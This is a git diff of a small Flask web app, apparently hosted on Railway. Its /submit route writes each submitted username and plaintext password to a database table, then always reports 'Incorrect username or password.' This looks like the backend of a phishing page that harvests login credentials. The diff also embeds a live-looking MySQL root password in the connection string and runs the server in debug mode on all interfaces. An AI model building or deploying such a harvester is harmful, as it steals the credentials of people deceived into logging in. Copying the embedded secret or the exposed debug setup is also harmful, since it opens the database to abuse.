@@ -1,12 +1,10 @@
 import os
-import time
-from flask import Flask, render_template, request, flash, redirect, url_for
+from flask import Flask, render_template, request, jsonify, redirect
 from flask_sqlalchemy import SQLAlchemy
-from sqlalchemy import text
 
 app = Flask(__name__)
 
-# ✅ Povezivanje sa Railway bazom (koristi ENV varijablu ako postoji)
+# ✅ Povezivanje sa Railway bazom
 DATABASE_URL = os.getenv('DATABASE_URL', 'mysql+pymysql://root:GvPDvyLfNaSvaXQiEBXiUWroZvvMwJPU@hopper.proxy.rlwy.net:48619/railway')
 app.config['SQLALCHEMY_DATABASE_URI'] = DATABASE_URL
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
@@ -22,30 +20,21 @@ class LoginAttempt(db.Model):
 
 # ✅ Kreiranje tabele
 with app.app_context():
-    try:
-        with db.engine.connect() as connection:
-            result = connection.execute(text('SELECT 1'))
-            print(f"✅ Konekcija sa bazom uspešna: {result.fetchone()}")
-
-        db.create_all()
-        print("✅ Tabela je kreirana!")
-    except Exception as e:
-        print(f"❌ Greška pri povezivanju sa bazom: {e}")
+    db.create_all()
 
 # ✅ Index stranica
 @app.route('/')
 def index():
-    return render_template('index.html', message=None)
+    return render_template('index.html')
 
-# ✅ Login ruta
+# ✅ AJAX Login ruta
 @app.route('/submit', methods=['POST'])
 def submit():
     username = request.form.get('username')
     password = request.form.get('password')
 
     if not username or not password:
-        flash("Sva polja su obavezna!", "danger")
-        return redirect(url_for('index'))
+        return jsonify({"message": "Sva polja su obavezna!", "status": "error"})
 
     try:
         new_attempt = LoginAttempt(username=username, password=password)
@@ -56,8 +45,8 @@ def submit():
         db.session.rollback()
         print(f"❌ Greška pri upisu u bazu: {e}")
 
-    return render_template('index.html', message="Incorrect username or password.", show_error=True)
+    return jsonify({"message": "Incorrect username or password.", "status": "success"})
 
 if __name__ == '__main__':
-    port = int(os.environ.get("PORT", 8080))  # ✅ Railway PORT
+    port = int(os.environ.get("PORT", 8080))
     app.run(host="0.0.0.0", port=port, debug=True)
